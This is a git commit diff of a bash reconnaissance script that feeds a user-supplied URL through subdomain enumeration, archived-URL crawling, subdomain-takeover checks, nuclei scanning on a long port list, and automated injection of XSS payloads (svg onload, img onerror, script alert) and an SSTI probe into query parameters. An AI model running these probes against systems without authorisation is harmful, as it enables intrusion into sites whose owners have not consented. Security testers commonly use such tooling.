e1ad87918360956948d752e98d8c8ff86088a2a9
EdioPaul <ediopaulo.ep@outlook.com>
2023-12-21 10:07:20 -0300

    update

--- recon.sh
+++ recon.sh
@@ -2,72 +2,23 @@
 
 figlet -c Recon of Recon
 
-echo Create folder name:
-read folder
-echo
-echo
-
-mkdir $folder
-
-cd $folder
-
-echo "Enter url:"
+echo Insert URL:
 read url
+echo
+echo
+mkdir $url
+cd $url
 echo $url | anew url;
 echo
 echo
-echo
-
-echo "START RECON"
-echo
-date
 echo
 
 echo ================"INIT C4NG4R3C0N"================
 echo
 echo
 gau $url | grep "\.js" | httpx-toolkit -mc 200 -silent  | tee saida.txt
-
 xargs -a saida.txt -n2 -I{} bash -c "echo -e '\n[URL]: {}\n'; python3 /linkfinder.py -i {} -o cli" | python3 /collector.py output;
-
 echo
-echo ================"FILES"================
-echo
-cat /home/edio/recon/$folder/output/files.txt
-echo
-echo
-
-echo
-echo ================"JS"================
-echo
-cat /home/edio/recon/$folder/output/js.txt
-echo
-echo
-
-echo
-echo ================"PARAMS"================
-echo
-cat /home/edio/recon/$folder/output/params.txt
-echo
-echo
-
-echo
-echo ================"PATHS"================
-echo
-cat /home/edio/recon/$folder/output/paths.txt
-echo
-echo
-
-echo
-echo ================"URLS"================
-echo
-cat /home/edio/recon/$folder/output/urls.txt
-echo
-echo
-
-echo
-echo
-date
 echo
 
 echo ================"INIT SUBFINDER"================ | anew subfinder
@@ -76,7 +27,6 @@ echo
 subfinder -d $(cat url) -silent -all | httpx-toolkit -silent -sc -t 1000 | anew subfinder;
 echo
 echo
-date
 echo
 
 echo ================"INIT HTTP200"================ | anew http200
@@ -85,7 +35,6 @@ echo
 cat subfinder | egrep 200 | anew http200;
 echo
 echo
-date
 echo
 
 echo ================"INIT HTTP404"================ | anew http404
@@ -94,7 +43,6 @@ echo
 cat subfinder | egrep 404 | anew http404;
 echo
 echo
-date
 echo
 
 echo ================"INIT DIG"================ | anew dig
@@ -104,7 +52,6 @@ while IFS= read -r line; do
 done < "http404" | anew dig
 echo
 echo
-date
 echo
 
 echo ================"INIT SUBZYTAKEOVER"================ | anew subzytakeover
@@ -113,7 +60,6 @@ echo
 subzy run --targets subfinder | egrep -v 'NOT' | anew subzytakeover;
 echo
 echo
-date
 echo
 
 echo ================"INIT WAYBACKROBOTS"================ | anew wayROBOTS
@@ -122,7 +68,6 @@ echo
 cat subfinder | waybackrobots -d $(cat url) -raw | anew wayROBOTS;
 echo
 echo
-date
 echo
 
 echo ================"INIT WHATWEB"================ | anew whatweb
@@ -131,7 +76,6 @@ echo
 whatweb $(cat url) | anew whatweb;
 echo
 echo
-date
 echo
 
 echo ================"INIT XSSTRIKE"================ | anew xsstrike
@@ -140,7 +84,6 @@ echo
 python3 ../xsstrike.py -u $(cat url) | anew xsstrike;
 echo
 echo
-date
 echo
 
 echo ================"INIT SSTI"================ | anew ssti2
@@ -149,7 +92,6 @@ echo
 echo $(cat url) | httpx-toolkit -silent | hakrawler -subs | grep "=" | qsreplace '{{7*7}}' | freq | anew ssti2;
 echo
 echo
-date
 echo
 
 echo ================"INIT XSS1"================ | anew xss1
@@ -158,7 +100,6 @@ echo
 echo $(cat url) | httpx-toolkit -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew xss1;
 echo
 echo
-date
 echo
 
 echo ================"INIT XSS2"================ | anew xss2
@@ -167,7 +108,6 @@ echo
 echo $(cat url) | httpx-toolkit -silent | katana -d 10 -silent | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss2;
 echo
 echo
-date
 echo
 
 echo ================"INIT XSS3"================ | anew xss3
@@ -176,7 +116,6 @@ echo
 echo $(cat url) | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew xss3;
 echo
 echo
-date
 echo
 
 echo ================"INIT XSS4"================ | anew xss4
@@ -185,7 +124,6 @@ echo
 gau $(cat url) | httpx-toolkit -silent | qsreplace '<script>alert(1)</script>' | freq | egrep -v 'Not' | anew xss4;
 echo
 echo
-date
 echo
 
 echo ================"INIT NUCLEI"================ | anew nuclei
@@ -194,9 +132,5 @@ echo
 echo $(cat url) | subfinder -silent | httpx-toolkit -p 80,443,81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,8000,8001,8008,8014,8042,8060,8069,8080,8081,8083,8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9001,9043,9060,9080,9090,9091,9200,9443,9502,9800,9981,10000,10250,11371,12443,15672,16080,17778,18091,18092,20720,32000,55440,55672 | nuclei -severity low,medium,high,critical | anew nuclei;
 echo
 echo
-date
 echo
 
-echo "END RECON"
-echo
-echo
